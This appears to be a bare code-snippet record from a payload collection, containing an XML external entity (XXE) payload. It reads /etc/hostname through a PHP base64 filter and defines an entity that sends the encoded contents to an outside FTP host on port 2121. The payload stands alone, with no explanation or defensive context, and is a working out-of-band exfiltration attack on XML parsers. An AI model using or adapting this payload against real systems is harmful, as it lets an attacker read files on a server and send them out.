---
id: 4d9df60b-5aee-4eba-9ade-4898eb1dd8f5
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.559016+00:00'
updated_at: '2023-04-10T20:24:37.953681+00:00'
---

# Code Snippet 4d9df60b

**Language**: xml

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://example.org:2121/%data;'>">
```
